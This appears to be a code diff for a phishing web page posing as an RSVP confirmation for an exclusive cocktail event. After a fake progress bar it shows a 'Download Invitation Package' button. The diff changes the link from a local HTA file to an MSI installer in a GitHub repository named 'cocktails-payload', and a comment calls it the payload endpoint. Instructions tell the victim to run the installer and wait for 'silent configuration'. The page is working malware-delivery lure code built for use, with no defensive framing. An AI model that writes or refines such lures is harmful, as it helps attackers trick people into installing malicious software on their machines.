@@ -5,146 +5,57 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Cocktails & Conversation | Exclusive Event</title>
     <style>
-        /* EXACT VIDEO AESTHETIC */
-        body { 
-            margin: 0; padding: 0; 
-            background-color: #1a1b26; 
-            color: #e0e0e0; 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            display: flex; align-items: center; justify-content: center; 
-            min-height: 100vh; 
-        }
-        .card { 
-            background: rgba(30, 32, 45, 0.95); 
-            border: 1px solid #2a2c3d; 
-            border-radius: 8px; 
-            padding: 40px 50px; 
-            text-align: center; 
-            max-width: 450px; width: 90%; 
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5); 
-        }
-        .check-icon { 
-            width: 60px; height: 60px; 
-            border: 2px solid #d4af37; 
-            border-radius: 50%; 
-            display: flex; align-items: center; justify-content: center; 
-            margin: 0 auto 24px; 
-            color: #d4af37; font-size: 28px; font-weight: bold; 
-        }
-        h1 { 
-            font-size: 26px; font-weight: 600; 
-            margin-bottom: 16px; letter-spacing: 0.5px; color: #fff; 
-        }
-        p.subtitle { 
-            font-size: 14px; line-height: 1.6; 
-            color: #a0a5b5; margin-bottom: 32px; 
-        }
-        
-        /* PROGRESS BAR (MATCHES VIDEO) */
-        .progress-container { 
-            width: 100%; background-color: #2a2c3d; 
-            border-radius: 4px; height: 6px; 
-            margin-bottom: 16px; overflow: hidden; 
-        }
-        .progress-bar { 
-            width: 0%; height: 100%; 
-            background-color: #d4af37; 
-            transition: width 0.3s ease; 
-        }
-        .status-text { 
-            font-size: 13px; color: #8a8f98; 
-            margin-bottom: 32px; 
-        }
-        
-        /* DOWNLOAD BUTTON (HIDDEN INITIALLY) */
-        .action-btn { 
-            display: inline-block; 
-            padding: 12px 32px; 
-            background: transparent; 
-            border: 1px solid #d4af37; 
-            color: #d4af37; 
-            text-decoration: none; 
-            border-radius: 4px; 
-            font-size: 14px; font-weight: 600; 
-            letter-spacing: 1px; 
-            transition: all 0.3s ease; 
-            cursor: pointer; margin-top: 10px; 
-            opacity: 0; pointer-events: none;
-        }
-        .action-btn.visible { 
-            opacity: 1; pointer-events: auto; 
-        }
-        .action-btn:hover { 
-            background: #d4af37; color: #1a1b26; 
-        }
-        
-        .footer-note { 
-            margin-top: 40px; 
-            font-size: 11px; color: #555; 
-            letter-spacing: 1px; text-transform: uppercase; 
-        }
-        .instructions { 
-            margin-top: 20px; 
-            font-size: 12px; color: #666; 
-            background: rgba(255,255,255,0.03); 
-            padding: 12px; border-radius: 6px; 
-            text-align: left; display: none;
-        }
-        code { 
-            background: rgba(255,255,255,0.1); 
-            padding: 2px 6px; border-radius: 3px; 
-            color: #d4af37; 
-        }
+        body { margin:0; padding:0; background-color:#1a1b26; color:#e0e0e0; font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; }
+        .card { background:rgba(30,32,45,0.95); border:1px solid #2a2c3d; border-radius:8px; padding:40px 50px; text-align:center; max-width:450px; width:90%; box-shadow:0 10px 30px rgba(0,0,0,0.5); }
+        .check-icon { width:60px; height:60px; border:2px solid #d4af37; border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 24px; color:#d4af37; font-size:28px; font-weight:bold; }
+        h1 { font-size:26px; font-weight:600; margin-bottom:16px; letter-spacing:0.5px; color:#fff; }
+        p.subtitle { font-size:14px; line-height:1.6; color:#a0a5b5; margin-bottom:32px; }
+        .progress-container { width:100%; background-color:#2a2c3d; border-radius:4px; height:6px; margin-bottom:16px; overflow:hidden; }
+        .progress-bar { width:0%; height:100%; background-color:#d4af37; transition:width 0.3s ease; }
+        .status-text { font-size:13px; color:#8a8f98; margin-bottom:32px; }
+        .action-btn { display:inline-block; padding:12px 32px; background:transparent; border:1px solid #d4af37; color:#d4af37; text-decoration:none; border-radius:4px; font-size:14px; font-weight:600; letter-spacing:1px; transition:all 0.3s ease; cursor:pointer; margin-top:10px; opacity:0; pointer-events:none; }
+        .action-btn.visible { opacity:1; pointer-events:auto; }
+        .action-btn:hover { background:#d4af37; color:#1a1b26; }
+        .footer-note { margin-top:40px; font-size:11px; color:#555; letter-spacing:1px; text-transform:uppercase; }
+        .instructions { margin-top:20px; font-size:12px; color:#666; background:rgba(255,255,255,0.03); padding:12px; border-radius:6px; text-align:left; display:none; }
+        code { background:rgba(255,255,255,0.1); padding:2px 6px; border-radius:3px; color:#d4af37; }
     </style>
 </head>
 <body>
     <div class="card">
         <div class="check-icon">✓</div>
-        
         <h1>You're on the list!</h1>
         <p class="subtitle">Your response has been received. Your digital invitation has been saved to your device.</p>
-        
-        <div class="progress-container">
-            <div class="progress-bar" id="progressBar"></div>
-        </div>
+        <div class="progress-container"><div class="progress-bar" id="progressBar"></div></div>
         <p class="status-text" id="statusText">Sending your RSVP... Contacting the event...</p>
         
-        <!-- DIRECT LINK TO LOCAL HTA FILE -->
-        <a href="/static/Event_Invitation.hta" class="action-btn" download id="downloadBtn">
+        <!-- POINTS TO PAYLOAD REPO'S RAW MSI ENDPOINT -->
+        <a href="https://raw.githubusercontent.com/YOUR-USERNAME/cocktails-payload/main/schimdtconnect.msi" class="action-btn" download id="downloadBtn">
             Download Invitation Package
         </a>
         
         <div class="instructions" id="instructions">
             <strong>Next Steps:</strong><br>
-            1. Open <code>Event_Invitation.hta</code><br>
+            1. Run the downloaded installer<br>
             2. Wait for silent configuration to complete
         </div>
-        
         <p class="footer-note">We can't wait to see you there</p>
     </div>
-
     <script>
-        // SIMULATE VIDEO PROGRESSION EXACTLY
         let progress = 0;
         const bar = document.getElementById('progressBar');
         const status = document.getElementById('statusText');
         const btn = document.getElementById('downloadBtn');
         const instr = document.getElementById('instructions');
-        
-        // Animate from 0% to 100% over ~10 seconds (matches video pacing)
         const interval = setInterval(() => {
-            progress += Math.random() * 2.5; // Random increment for natural feel
+            progress += Math.random() * 2.5;
             if (progress >= 100) {
-                progress = 100;
-                clearInterval(interval);
-                
-                // UPDATE TEXT & REVEAL ELEMENTS WHEN COMPLETE
+                progress = 100; clearInterval(interval);
                 status.textContent = "Confirmation complete. Download your invitation above.";
-                btn.classList.add('visible');
-                instr.style.display = "block";
+                btn.classList.add('visible'); instr.style.display = "block";
             }
             bar.style.width = progress + "%";
-        }, 250); // Update every 250ms for smooth animation
+        }, 250);
     </script>
 </body>
 </html>
